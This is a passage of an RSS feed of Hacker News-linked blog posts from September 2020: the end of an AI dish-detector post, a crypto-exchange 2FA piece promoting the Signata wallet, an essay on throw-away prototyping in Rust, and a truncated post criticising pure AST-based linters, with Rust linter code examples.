https://blog.codecentric.de/files/2020/09/google_coral_device.png 1600w" sizes="(max-width: 250px) 100vw, 250px"></a></p><p id="caption-attachment-77693">Google coral device</p></div><p>The construction of the dish-o-tron including the deployment of the model on the Coral device and its technical details will be discussed in an upcoming blog post.</p><h2>Conclusion</h2><p>AI research has brought us new technology that can solve problems that couldn‚Äôt be solved before. Have you read the book AI superpowers by Kai-Fu Lee? He says that you don‚Äôt need to be one of the best AI researchers any more to apply AI and find new business opportunities. You need to collect (lots of) data and can ‚Äújust‚Äù use existing algorithms, services and open source frameworks. Well, in our opinion building AI solutions is not easy ‚Äì but it is indeed getting easier and easier every day.</p><p>See the first prototype running on the google AIY kit here (mind the green/red LED at the box):</p><p>Follow this blog series if you want to know how to build and run such a model on an edge device yourself. Building the dish-o-tron will fundamentally change the way you experience the community kitchen. Instead of being a place of constant anger and hostility, the community kitchen will become a peaceful meeting ground for sharing ideas and connecting with co-workers.</p><p>In the upcoming blog posts, we will guide you through the process of building your own dish-o-tron for your community kitchen sink. Hence, we will tackle a real-world problem and playfully learn how to build and improve an AI system from scratch. Stay tuned!</p></div></div>]]>
            </description>
            <link>https://blog.codecentric.de/en/2020/09/dish-o-tron-no-more-dirty-dishes-ai/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24588115</guid>
            <pubDate>Fri, 25 Sep 2020 09:28:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why 2FA isn't enough with Crypto Exchanges]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24588024">thread link</a>) | @timothy-quinn
<br/>
September 25, 2020 | https://blog.congruentlabs.co/why-2fa-isnt-enough-with-exchanges/ | <a href="https://web.archive.org/web/*/https://blog.congruentlabs.co/why-2fa-isnt-enough-with-exchanges/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://blog.congruentlabs.co/content/images/size/w300/2020/09/Keep-Crypto-Decentralized.png 300w,
                            https://blog.congruentlabs.co/content/images/size/w600/2020/09/Keep-Crypto-Decentralized.png 600w,
                            https://blog.congruentlabs.co/content/images/size/w1000/2020/09/Keep-Crypto-Decentralized.png 1000w,
                            https://blog.congruentlabs.co/content/images/size/w2000/2020/09/Keep-Crypto-Decentralized.png 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://blog.congruentlabs.co/content/images/size/w2000/2020/09/Keep-Crypto-Decentralized.png" alt="Why 2FA isn't enough with Crypto Exchanges">
            </figure>

            <section>
                <div>
                    <p>A lot of trust needs to be put in to cryptocurrency exchanges. Firstly because you're entrusting them with your Fiat currency, and secondly because you're entrusting them with the <em>keys </em>to your cryptocurrency.</p><p>Each cryptocurrency address, regardless if it's Bitcoin, Litecoin, or Ethereum, is a public representation of a pair of <em>cryptographic keys</em>. That pair consists of two parts - a <strong>public </strong>key, and a <strong>private </strong>key. What's important here is that the <strong>private </strong>key is what allows you to make transactions, giving you the ability to transfer coins to other parties.</p><p>Now if you've ever used an exchange before, you'll notice that <strong>you don't normally see these keys</strong>. The exchange is managing it all for you in the background. They might have the keys for a Bitcoin or Ethereum address specifically created for your account in the background, which they're using to then make the trades that you ask them to via their website or app.</p><p>This is great, but those private keys? You're not going to see them. In fact if you transfer coins out of exchanges and <a href="https://live.blockcypher.com/">watch the transaction with a service like BlockCypher</a> - you'll often see the amount you transferred came from some address that was holding a lot more on it as a pool for multiple users, and your particular amount was divvied out to wherever you asked it to go with the remainer staying on the original address or moved somewhere else.</p><p>This kind of environment wasn't quite the intent for cryptocurrency - the intent was to <em>decentralise </em>- i.e. as a user, you control your own keys - not some larger authority like a bank. Most of the popular exchanges are well run and have proven themselves so far regarding trust and security, but ultimately they still hold your keys. They can assure you of their security controls and processes over and over, even enabling 2-Factor Authentication to <em>really</em> lock down access with YubiKeys, OTP tokens, and SMS codes. They can assure you that they provide cold storage services to <em>really</em> lock down access. But even 5 or 500 layers of security, never forget <strong>- they still hold your keys</strong>.</p><h2 id="so-what-should-you-do">So what should you do?</h2><p>The first step is to take ownership back. Most exchanges provide a capability to <em>send</em> your holdings to another address. They usually bury that feature behind a bunch of menus, but you should hopefully find the capability. All you need to do is create addresses in a product under your control, like <a href="https://signata.net/">Signata</a>, and then you can use those addresses as the destination for sending your holdings from the exchange.</p><p>The second step is to enable 2FA on the exchange. Yes, we've just outlined why 2FA isn't enough to protect your holdings - but that doesn't mean you shouldn't be using it anyway. At some point you're going to want to move your holding from Signata back into the exchange to trade them for fiat (or other currencies). If your exchange supports YubiKeys for 2FA, then great! - you can use your same YubiKey for both logging in to the exchange, and protecting your private keys in <a href="https://signata.net/">Signata</a>.</p><p>The most secure way to keep cryptocurrency is to stay decentralised. Be the owner of your crypto assets, and keep the power to send them wherever and whenever you want. Don't let exchanges hold on to your assets - hold them in a wallet that <em>you</em> control. <a href="https://signata.net/">Try Signata today for free</a> - you can add as many addresses and YubiKeys and you like, and we never see your private keys.</p>
                </div>
            </section>

            
            
        </article>
    </div>
</div></div>]]>
            </description>
            <link>https://blog.congruentlabs.co/why-2fa-isnt-enough-with-exchanges/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24588024</guid>
            <pubDate>Fri, 25 Sep 2020 09:13:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Throw away code]]>
            </title>
            <description>
<![CDATA[
Score 80 | Comments 60 (<a href="https://news.ycombinator.com/item?id=24587934">thread link</a>) | @lukastyrychtr
<br/>
September 25, 2020 | https://vorner.github.io/2020/09/20/throw-away-code.html | <a href="https://web.archive.org/web/*/https://vorner.github.io/2020/09/20/throw-away-code.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main_content_wrap">
      <section id="main_content">
        

<p>There‚Äôs an ongoing discussion about what makes Python better prototyping
language than Rust (with Python being probably just the archetype of some
scripted weakly-typed language). The thing is, I prefer doing my prototypes in
Rust over Python. Apparently, I‚Äôm not the only one. So I wanted to share few
things about what makes Rust viable for these kinds of throw-away coding
sprints, at least for me.</p>

<h2 id="our-goals">Our goals</h2>

<p>Sometimes, our goal isn‚Äôt really to write perfect code that is performant,
correct, handles all kinds of errors sanely, has great UX and is maintainable.
These projects are what we are proud of, sure. We pin them on github profiles.
We write blog posts about them. We write whole handbooks of best practices how
to do them.</p>

<p>But sometimes we just need to throw something together really fast and don‚Äôt
care about the quality as much. That kind of bit of cardboard and huge amount of
duck tape thing. These include:</p>

<ul>
  <li>Single-use debugging tools (‚ÄûI need to throw 10k of these weird requests at
the server to see if it triggers the bug. It didn‚Äôt? Ok, let‚Äôs try something
else‚Ä¶‚Äú)</li>
  <li>Searching for a counter-example to a claim in a scientific paper (‚ÄûI can prove
it‚Äôs a counter example once I have it, so I won‚Äôt need the code any more‚Äú)</li>
  <li>Processing bunch of data just once (‚ÄûI wonder how many of these <code>.txt</code> files
have broken unicode in them‚Äú)</li>
  <li>Figuring if something has any chance to fly at all, before committing to it
(‚ÄûCould I distribute the changes as compressed binary diffs, or would that be
too large?‚Äú)</li>
  <li>Demonstration purposes (‚ÄûWe would like to build something in lines of this,
but, you know, actually working‚Äú)</li>
</ul>

<p>Of course, there‚Äôs a lot more. I‚Äôm not even sure if there‚Äôs more of the ‚Äûproper‚Äú
coding or of this ‚Äûthrow away‚Äú coding. Except that we don‚Äôt really brag about
our throw-away code (‚ÄûLook what terrible monster I‚Äôve stitched together during
the lunch break‚Äú), we don‚Äôt write tutorials how to write them much, etc. So this
is exactly the kind of blog post we don‚Äôt write üòà.</p>

<p>Instead of writing something proper this time, we are going to talk about
how to write terrible code, but fast. We have decided to make an explicitly
sloppy job of this one and admit it to ourselves not to feel ashamed of it
later:</p>

<ul>
  <li>We want to spend as little time on it as possible. Just do it, throw the code
away after it had its use and move on. This one is going to be over by lunch
time.</li>
  <li>We don‚Äôt care about performance that much (as long as it finishes running
before the lunch too).</li>
  <li>We don‚Äôt care about handling all corner cases, only the ones we actually
encounter in the data.</li>
  <li>We don‚Äôt care about documentation or readability.</li>
  <li>We don‚Äôt care about tests, provided we are confident enough the answers are
accurate enough.</li>
  <li>Actually, we don‚Äôt really care at all‚Ä¶</li>
</ul>

<p><em>Note: make sure not to let anyone put this into production üòá. If you don‚Äôt
delete it, make sure there‚Äôs a comment on a prominent place warning people not
to use it.</em></p>

<h2 id="why-do-people-think-python-fits-here-better-than-rust">Why do people think Python fits here better than Rust</h2>

<p>The thing is, Rust <em>makes us</em> care. That‚Äôs one of the points of Rust. It‚Äôll
complain that our code is not production quality and that we need to do better
to save on the pain down the line. Its type system can be a real prick in
insisting on little details, like that ints and strings are not really the same
thing and that there‚Äôs a difference between owned and borrowed thing and‚Ä¶ Well,
you know, all that stuff. Rust wants you to make good, proper, maintainable
code.</p>

<p>On the other hand, Python doesn‚Äôt really insist on anything. Therefore, it is
easier to not care in Python.</p>

<h2 id="my-own-experience">My own experience</h2>

<p>I know a bunch of programming languages and reach for the one that I hope would
suit me best in the given time. So, for some really simple things I simply put
together few lines of shell (and some slightly less simple ones ‚Äí I‚Äôm ashamed to
admit that some 1000 lines long shell monster kept running in real production
for years ‚Äí but it <em>did run</em>). If it can be done by 2 or 3 ugly pipelines, it‚Äôs
fine.</p>

<p>Over the years, I‚Äôve used Perl a lot (that one doesn‚Äôt care if it‚Äôs int or
string‚Ä¶ no, correction, in Perl everything is a string, ints just don‚Äôt exist.
Well, kind of). It‚Äôs probably <em>the</em> language designed for throw away coding.
I‚Äôve done some Python too (that‚Äôs like Perl, but with proper objects in it, and
everything is a dictionary there).</p>

<p>But recently I‚Äôve noticed that if I try to do a similar thing, I do it faster in
Rust. Not that it runs faster (well, that usually too, but that‚Äôs not the
point), but that I‚Äôm done with the task at hand sooner and with slightly smaller
amount of cursing.</p>

<p>This certainly is in part because I‚Äôm more proficient in Rust than in Python.
It‚Äôs also because the Rust mental model is closer to how my brain works than the
Python one. <strong>Your mileage will vary</strong> ‚Äí if you‚Äôre a Python matador who‚Äôs been
coding in it for decades and are just learning Rust, you‚Äôll certainly do it
faster in Python.</p>

<p>But also, there are some tricks you might employ to do these things in Rust
faster (that is, faster than you do now, not necessarily faster than in
<code>$OTHER_LANGUAGE</code>).</p>

<h2 id="tricks-for-faster-coding">Tricks for faster coding</h2>

<h3 id="compile-times">Compile times</h3>

<p>Rust is known for its slow compile times. Python has <em>no</em> compile times. If you
have to wait every time for the compilation just to have a bunch of errors
thrown into your face, it‚Äôs going to slow you down. Especially because Rust
<em>likes to</em> throw bunch of errors at you every time you try to compile it. Rust
is known for its great error messages, so it wants to brag how good they are by
using them <em>a lot</em>.</p>

<p>You can, however, notice that you don‚Äôt really need to <em>build and run</em> every
time. That you often just want to check everything is on the right path. For
Python, you do need to actually run the thing (because Python doesn‚Äôt really
have much of a compile time so it likes to throw the bunch of errors into your
face at <em>run time</em>), but Rust is the language that ‚Äûif
it compiles, it‚Äôs correct‚Äú. And by complies, I actually mean mostly type-checks.</p>

<p>What does this all mean? You can check out:</p>

<ul>
  <li>The <code>rust-analyzer</code> language server. You‚Äôll be getting red squiggles in the
editor instead of having to compile. It‚Äôs not perfect (sometimes the list of
errors is different, sometimes it just gives up on that particular project),
but it‚Äôs getting better and it points out most of the errors without any
compilation at all.</li>
  <li><code>cargo check</code> performs just the first stages of compilation and will stop
before codegen. It means it doesn‚Äôt produce anything that could be run, but
it is so much faster and provides the bunch of errors we so much want to have.</li>
  <li>You can let <code>cargo watch</code> keep recompiling the code asynchronously in another
terminal. I just glance at it to check if there are any errors around, but I
don‚Äôt wait for it ‚Äí at worst, the list of errors is one iteration outdated. It
can be used for other things, like keeping the documentation of the current
crate up to date, or having a head start at compiling the executable, or even
having all the tests being re-run on each save (I‚Äôm getting off topic here; we
are being sloppy here on purpose, so what tests are we talking about?)</li>
</ul>

<p>These don‚Äôt make the compile times shorter, but it eliminates the <em>waiting</em> for
them from the hot coding path. It still takes some time to compile (especially
if you have a lot of dependencies and do a clean release build), but that
doesn‚Äôt mean it has to slow you down.</p>

<h3 id="embrace-the-type-system-and-borrow-checker-and-all-of-these-things">Embrace the type system (and borrow checker and all of these things)</h3>

<p>After some time working with Rust, one learns to lean onto them instead of
fighting them.</p>

<p>This is where most of my own speed up comes from and what I miss about Python.
When I want to know if my code is working, I actually have to run the Python
thing and feed it with data. Which means I either need to set up a smaller input
or wait for the whole thing to get crunched, only to have it explode on some
typo or switched order of parameters after 5 minutes of running. After 10
iterations of running the Python code (each crashing later and later in the
code), it finally finishes. By that time, I‚Äôm no longer confident it does what
it should, after all these retries, so I go back and have to figure a way to
double-check it.</p>

<p>In Rust not only I don‚Äôt have to run the code until it is almost finished and
even when I feed it the whole input (which I usually do), it‚Äôs usually faster
and it runs to completion the first time. I also can move through the code much
faster. With Python, I stop to check the documentation, think about what type
goes where, etc, exactly because it‚Äôs so painful to find out only at runtime. I
need to be careful while writing the code.
With Rust, I just type the code, get the red squiggly, fix it and move on. I
outsource that effort of checking if these things click together in any
meaningful way to the compiler.</p>

<p>This is kind of in the theme of ‚Äûhurry slowly‚Äú approach. By making sure
everything has the right types and aligns well, it makes each iteration slower.
But it also makes it possible to have much fewer iterations before the whole
thing works well enough.</p>

<p>Also, don‚Äôt fall for the impression that throwing <code>unsafe</code> in there to bypass
some of the checking will save you time. It won‚Äôt. It‚Äôs a trap. If you don‚Äôt
know for sure that you need it, then you probably don‚Äôt and doing <code>unsafe</code> right
is a lot of work. Doing it wrong is easy, maybe easier than doing it safely, but
you‚Äôll pay for it later on, when trying to figure out why the thing does
something arcanely weird. If you put any non-trivial <code>unsafe</code> in the code,
you‚Äôre risking spending days and nights in front of a debugger. The checks are
there for a reason.</p>

<h3 id="take-the-easy-way-out">Take the easy way out</h3>

<p>I don‚Äôt say to clone everything. Even in prototyping code, I often take <code>&amp;str</code>
as parameter if it‚Äôs just ‚Äûlooking at it‚Äú. But I do so in the obvious, trivial
cases. The ones I don‚Äôt really need to think about any more.</p>

<p>But if you ever find yourself thinking about writing any kind of
<code>-&gt; impl Iterator&lt;Item = &amp;impl Display&gt; + '_</code>, just stop and throw a
<code>Vec&lt;String‚Ä¶</code></p></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://vorner.github.io/2020/09/20/throw-away-code.html">https://vorner.github.io/2020/09/20/throw-away-code.html</a></em></p>]]>
            </description>
            <link>https://vorner.github.io/2020/09/20/throw-away-code.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24587934</guid>
            <pubDate>Fri, 25 Sep 2020 08:55:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Pure AST based linting sucks]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24587543">thread link</a>) | @lukastyrychtr
<br/>
September 25, 2020 | https://rdambrosio016.github.io/rust/2020/09/18/pure-ast-based-linting-sucks.html | <a href="https://web.archive.org/web/*/https://rdambrosio016.github.io/rust/2020/09/18/pure-ast-based-linting-sucks.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>First blog post! For this blog post i would like to talk about various issues around linters which exclusively use ASTs (Abstract Syntax Tree) for linting source code, and a tree representation you may not know about. Over many months of working on a JavaScript linter in rust called <a href="https://github.com/RDambrosio016/RSLint/tree/dev">rslint</a> i have encountered numerous issues and have explored many concepts which i feel i should share to offer insights into why i believe purely AST based linting is unfit for complex linters.</p>

<p>This post mostly refers to the issues with pure typed AST based linting in statically typed languages such as rust, However, most of the issues occur in dynamically typed languages too.</p>

<p>I will be giving a small introduction to how linters work, feel free to skip to the <a href="#Problems-with-ASTs">Problems with ASTs</a> if you already know how linters work.</p>



<ul id="markdown-toc">
  <li><a href="#table-of-contents" id="markdown-toc-table-of-contents">Table of contents</a></li>
  <li><a href="#so-how-does-a-linter-work" id="markdown-toc-so-how-does-a-linter-work">So how does a linter work?</a></li>
  <li><a href="#problems-with-asts" id="markdown-toc-problems-with-asts">Problems with ASTs</a>    <ul>
      <li><a href="#expensive-to-clone" id="markdown-toc-expensive-to-clone">Expensive to clone</a></li>
      <li><a href="#complex-node-traversal-is-impossible" id="markdown-toc-complex-node-traversal-is-impossible">Complex node traversal is impossible</a>        <ul>
          <li><a href="#need-for-visitors" id="markdown-toc-need-for-visitors">Need for visitors</a></li>
          <li><a href="#bottom-up-rule-checking" id="markdown-toc-bottom-up-rule-checking">Bottom-up rule checking</a></li>
        </ul>
      </li>
      <li><a href="#no-easy-access-to-tokens-or-child-nodes" id="markdown-toc-no-easy-access-to-tokens-or-child-nodes">No easy access to tokens or child nodes</a></li>
      <li><a href="#lossy" id="markdown-toc-lossy">Lossy</a></li>
      <li><a href="#require-explicit-handling-in-the-parser" id="markdown-toc-require-explicit-handling-in-the-parser">Require explicit handling in the parser</a></li>
      <li><a href="#mutable" id="markdown-toc-mutable">Mutable</a></li>
      <li><a href="#next-to-no-error-recovery" id="markdown-toc-next-to-no-error-recovery">Next to no error recovery</a></li>
    </ul>
  </li>
  <li><a href="#alternatives-to-the-standard-ast" id="markdown-toc-alternatives-to-the-standard-ast">Alternatives to the standard AST</a>    <ul>
      <li><a href="#downsides" id="markdown-toc-downsides">Downsides</a></li>
    </ul>
  </li>
  <li><a href="#acknowledgements" id="markdown-toc-acknowledgements">Acknowledgements</a></li>
  <li><a href="#further-reading" id="markdown-toc-further-reading">Further reading</a></li>
</ul>



<p>Linters are programs which statically analyze code for semantic, stylistic, and potentially erroneous issues. Linters traditionally work by taking source code, then running a parser on the source code, which yields an abstract representation of the program called an abstract syntax tree. Popular examples of linters include ESLint for JavaScript, and Clippy for rust. Some linters further rely on typechecking information like clippy, however i will not be focusing on that aspect for this post.</p>

<p>Once an abstract syntax tree has been built, the linter crawls (visits) the tree‚Äôs nodes (Items like an if statement, an if statement‚Äôs condition, its body, etc) and runs specific ‚Äúrules‚Äù on the node. An example of a rule may be ESLint‚Äôs <code>no-empty</code>, which visits block statements and checks if they contain no nodes and no comments.</p>

<p>Linters often offer autofix too, where the linter changes the source code to fix the issue for you. Usually this relies on text transformations, but many linters use AST transformations too.</p>



<p>Purely typed ASTs may appear to be the logical choice best choice when making a linter, however, ASTs have many inherent flaws which can make writing stylistic or more complex rules extremely inefficient or difficult. The main issues with purely typed ASTs include the following:</p>

<ul>
  <li>Often expensive to clone and pass around</li>
  <li>Complex Node traversal is impossible without runtime typing, and even with runtime typing it is extremely constrained.</li>
  <li>No straightforward way to obtain individual tokens or child nodes</li>
  <li>Lossy, no way to cleanly and efficiently represent whitespace inside of them, which is crucial for stylistic linting.</li>
  <li>Require explicit handling of their structures in the parser</li>
  <li>Mutable, which is fine for most cases but you really do not want mutable trees for static analysis in a language without a GC.</li>
  <li>Makes error recovery for a parser very constrained</li>
  <li>Incremental reparsing is impossible</li>
</ul>

<p>Let‚Äôs go through each of the issues one by one:</p>

<h2 id="expensive-to-clone">Expensive to clone</h2>

<p>AST nodes usually hold a decently large amount of information, this means if you want to pass around a node to an individual sub-analyzer (say, scope analysis) you must either pass references (would likely get you into lifetime hell very quickly), or clone the structure. Cloning the structure can often be relatively expensive due to the amount of information it holds, lets take a look at the <a href="https://github.com/swc-project/swc">swc</a> type definition for a Js/Ts class:</p>

<div><div><pre><code><span>/* Irrelevant serde attributes omitted */</span>
<span>pub</span> <span>struct</span> <span>Class</span> <span>{</span>
    <span>pub</span> <span>span</span><span>:</span> <span>Span</span><span>,</span>
    <span>pub</span> <span>decorators</span><span>:</span> <span>Vec</span><span>&lt;</span><span>Decorator</span><span>&gt;</span><span>,</span>
    <span>pub</span> <span>body</span><span>:</span> <span>Vec</span><span>&lt;</span><span>ClassMember</span><span>&gt;</span><span>,</span>
    <span>pub</span> <span>super_class</span><span>:</span> <span>Option</span><span>&lt;</span><span>Box</span><span>&lt;</span><span>Expr</span><span>&gt;&gt;</span><span>,</span>
    <span>pub</span> <span>is_abstract</span><span>:</span> <span>bool</span><span>,</span>
    <span>pub</span> <span>type_params</span><span>:</span> <span>Option</span><span>&lt;</span><span>TsTypeParamDecl</span><span>&gt;</span><span>,</span>
    <span>pub</span> <span>super_type_params</span><span>:</span> <span>Option</span><span>&lt;</span><span>TsTypeParamInstantiation</span><span>&gt;</span><span>,</span>
    <span>pub</span> <span>implements</span><span>:</span> <span>Vec</span><span>&lt;</span><span>TsExprWithTypeArgs</span><span>&gt;</span><span>,</span>
<span>}</span>
</code></pre></div></div>

<p>Now let‚Äôs say you made a scope analyzer, and you would like to be able to get the declared classes inside of a scope. You would have to expensively clone the class, or store the span, which leaves out info you may want such as the class‚Äô body. This often constrains the info a sub-analyzer can hold, and subsequently constrains complex error rendering.</p>

<h2 id="complex-node-traversal-is-impossible">Complex node traversal is impossible</h2>

<p>It is very common for a rule to want to know about the node‚Äôs parent/sibling/children/descendants. However, that is impossible without runtime typing in a statically typed language. Why exactly? well, AST nodes are standalone, they do not know about parents or siblings, they can only traverse top-down using explicit visitors. This brings about a couple of issues:</p>

<h3 id="need-for-visitors">Need for visitors</h3>

<p>ASTs are typed, which means to visit each node you need to explicitly handle every single node and visit each of their children explicitly. Which means you must either use a complex proc macro to generate a visit trait for you, or you need to implement it yourself, which is a gigantic pain and is impractical.</p>

<p>Moreover, Visit traits work by offering the visit functions as provided trait methods, but this means when you override them to check items you end up not visiting child nodes! This means you need must visit each child manually, which results in a ton of boilerplate code. A real world example of why this is a problem is <a href="https://github.com/denoland/deno_lint">deno_lint</a>, deno lint is incapable of catching <code>no-unsafe-finally</code> for this code:</p>

<div><div><pre><code><span>try</span> <span>{</span>
  <span>/* */</span>
<span>}</span> <span>finally</span> <span>{</span>
  <span>try</span> <span>{</span>
    <span>/* */</span>
  <span>}</span> <span>finally</span> <span>{</span>
    <span>throw</span> <span>"</span><span>oh no</span><span>"</span><span>;</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>This is because deno_lint‚Äôs <code>no-unsafe-finally</code> rule overrides the try statement visit method:</p>
<div><div><pre><code><span>fn</span> <span>visit_try_stmt</span><span>(</span><span>&amp;</span><span>mut</span> <span>self</span><span>,</span> <span>try_stmt</span><span>:</span> <span>&amp;</span><span>TryStmt</span><span>,</span> <span>_</span><span>parent</span><span>:</span> <span>&amp;</span><span>dyn</span> <span>Node</span><span>)</span> <span>{</span> <span>/* */</span> <span>}</span>
</code></pre></div></div>
<p>And does not recursively visit the body of the try statement, the catch body, or the finalizer statements.</p>

<p>To fix this major issue in many of deno_lint‚Äôs rules it would have to change every single visit function on every rule to include recursively visiting the children manually.</p>

<p>And finally, requiring a visitor introduces a big amount of boilerplate into each rule definition, let‚Äôs use deno_lint as an example again:</p>

<div><div><pre><code><span>impl</span> <span>LintRule</span> <span>for</span> <span>NoUnsafeFinally</span> <span>{</span>
  <span>fn</span> <span>new</span><span>()</span> <span>-&gt;</span> <span>Box</span><span>&lt;</span><span>Self</span><span>&gt;</span> <span>{</span>
    <span>Box</span><span>::</span><span>new</span><span>(</span><span>NoUnsafeFinally</span><span>)</span>
  <span>}</span>

  <span>fn</span> <span>code</span><span>(</span><span>&amp;</span><span>self</span><span>)</span> <span>-&gt;</span> <span>&amp;</span><span>'static</span> <span>str</span> <span>{</span>
    <span>"no-unsafe-finally"</span>
  <span>}</span>

  <span>fn</span> <span>lint_module</span><span>(</span><span>&amp;</span><span>self</span><span>,</span> <span>context</span><span>:</span> <span>Arc</span><span>&lt;</span><span>Context</span><span>&gt;</span><span>,</span> <span>module</span><span>:</span> <span>&amp;</span><span>Module</span><span>)</span> <span>{</span>
    <span>let</span> <span>mut</span> <span>visitor</span> <span>=</span> <span>NoUnsafeFinallyVisitor</span><span>::</span><span>new</span><span>(</span><span>context</span><span>);</span>
    <span>visitor</span><span>.visit_module</span><span>(</span><span>module</span><span>,</span> <span>module</span><span>);</span>
  <span>}</span>
<span>}</span>

<span>struct</span> <span>NoUnsafeFinallyVisitor</span> <span>{</span>
  <span>context</span><span>:</span> <span>Arc</span><span>&lt;</span><span>Context</span><span>&gt;</span><span>,</span>
<span>}</span>

<span>impl</span> <span>NoUnsafeFinallyVisitor</span> <span>{</span>
  <span>fn</span> <span>new</span><span>(</span><span>context</span><span>:</span> <span>Arc</span><span>&lt;</span><span>Context</span><span>&gt;</span><span>)</span> <span>-&gt;</span> <span>Self</span> <span>{</span>
    <span>Self</span> <span>{</span> <span>context</span> <span>}</span>
  <span>}</span>
<span>}</span>

<span>impl</span> <span>Visit</span> <span>for</span> <span>NoUnsafeFinallyVisitor</span> <span>{</span>
  <span>noop_visit_type!</span><span>();</span>

  <span>fn</span> <span>visit_try_stmt</span><span>(</span><span>&amp;</span><span>mut</span> <span>self</span><span>,</span> <span>try_stmt</span><span>:</span> <span>&amp;</span><span>TryStmt</span><span>,</span> <span>_</span><span>parent</span><span>:</span> <span>&amp;</span><span>dyn</span> <span>Node</span><span>)</span> <span>{</span>
    <span>/* rule checks omitted*/</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>Compared to rslint‚Äôs implementation (which is able to catch nested errors) which uses bottom-up node checking:</p>

<div><div><pre><code><span>declare_lint!</span> <span>{</span>
    <span>/* documentation omitted */</span>
    <span>#[derive(Default)]</span>
    <span>NoUnsafeFinally</span><span>,</span>
    <span>errors</span><span>,</span>
    <span>"no-unsafe-finally"</span>
<span>}</span>

<span>pub</span> <span>const</span> <span>CONTROL_FLOW_STMT</span><span>:</span> <span>[</span><span>SyntaxKind</span><span>;</span> <span>4</span><span>]</span> <span>=</span> <span>[</span><span>BREAK_STMT</span><span>,</span> <span>CONTINUE_STMT</span><span>,</span> <span>THROW_STMT</span><span>,</span> <span>RETURN_STMT</span><span>];</span>

<span>#[typetag::serde]</span>
<span>impl</span> <span>CstRule</span> <span>for</span> <span>NoUnsafeFinally</span> <span>{</span>
    <span>fn</span> <span>check_node</span><span>(</span><span>&amp;</span><span>self</span><span>,</span> <span>node</span><span>:</span> <span>&amp;</span><span>SyntaxNode</span><span>,</span> <span>ctx</span><span>:</span> <span>&amp;</span><span>mut</span> <span>RuleCtx</span><span>)</span> <span>-&gt;</span> <span>Option</span><span>&lt;</span><span>()</span><span>&gt;</span> <span>{</span>
        <span>if</span> <span>CONTROL_FLOW_STMT</span><span>.contains</span><span>(</span><span>&amp;</span><span>node</span><span>.kind</span><span>())</span> <span>&amp;&amp;</span> <span>node</span><span>.parent</span><span>()</span><span>?</span><span>.parent</span><span>()</span><span>?</span><span>.is</span><span>::</span><span>&lt;</span><span>ast</span><span>::</span><span>Finalizer</span><span>&gt;</span><span>()</span> <span>{</span>
            <span>self</span><span>.output</span><span>(</span><span>node</span><span>,</span> <span>ctx</span><span>);</span>
        <span>}</span>
        <span>None</span>
    <span>}</span>
<span>}</span>

<span>/* self.output error rendering */</span>
</code></pre></div></div>

<p>This way of using a visitor means each rule is actually made up of two structs, and the second struct needs to store an <code>Arc&lt;Context&gt;</code> to be able
to add diagnostics. This further introduces more issues i won‚Äôt get deep into but they include requiring the diagnostics vector in the context to be locked (through a mutex) to add a diagnostic, and not being able to cleanly refer to each rule‚Äôs diagnostics/outcome.</p>

<h3 id="bottom-up-rule-checking">Bottom-up rule checking</h3>

<p>Bottom-up rule checking is impossible, which many rules benefit greatly from, such as <a href="https://eslint.org/docs/rules/no-await-in-loop"><code>no-await-in-loop</code></a>.
This is because a node cannot know about its parent, swc‚Äôs visitor attempts to slightly get around this with a <code>_parent: &amp;dyn Node</code> on ever visitor function which is a simple wrapper on top of <a href="https://doc.rust-lang.org/std/any/trait.Any.html"><code>Any</code></a>. This still does not allow for recursive bottom-up checking, and it introduces the mess of needing to downcast the parent.</p>

<p>The fact that bottom-up rule checking is impossible means every rule must be a bottom-down check, which is usually ugly for the following reasons:</p>

<ul>
  <li>Oftentimes a rule wants to check a node, but only if its the child of a specific node, which requires explicit handling of each possible parent (see: <code>no-extra-boolean-cast</code>)</li>
  <li>It results in duplicate code for each parent</li>
</ul>

<p>Proof of this can be found in deno_lint‚Äôs <a href="https://github.com/denoland/deno_lint/blob/master/src/rules/no_await_in_loop.rs">implementation</a> of <code>no-await-in-loop</code>, which is 182 lines, versus rslint‚Äôs <a href="https://github.com/RDambrosio016/RSLint/blob/dev/rslint_core/src/groups/errors/no_await_in_loop.rs">implementation</a> which is 35 lines.</p>

<h2 id="no-easy-access-to-tokens-or-child-nodes">No easy access to tokens or child nodes</h2>

<p>ASTs are lossy, like the name implies, this means that it is impossible to straight from a node to its tokens. It may seem like a small issue but in reality it poses a ton of issues, these include, but are not limited to:</p>

<ul>
  <li>No lexical equality (counting <code>foo. bar</code> and <code>foo.bar</code> as the same expression)</li>
  <li>No simple implementation of individual token based rules</li>
  <li>No easy syntax highlighting without reinvoking the lexer</li>
  <li>No easy way to refer to an individual token for pretty errors</li>
</ul>

<p>To get around this, tools like ESLint store the tokens in a store then have methods on a context object to get the tokens. As you can probably guess, this brings about more issues:</p>

<ul>
  <li>No interning, which can make storing tokens expensive for things like <code>let</code>, <code>var</code>, etc.</li>
  <li>Another thing to implement and maintain.</li>
  <li>Tokens don‚Äôt know about their parent AST nodes .</li>
  <li>cont: Tokens cannot traverse their siblings, next tokens, prev tokens, etc.</li>
  <li>No whitespace and comment tokens, which results in ugly handling of comments and comment directives.</li>
</ul>

<h2 id="lossy">Lossy</h2>

<p>ASTs are lossy, this makes stylistic ‚Ä¶</p></div></article></div></div></div>
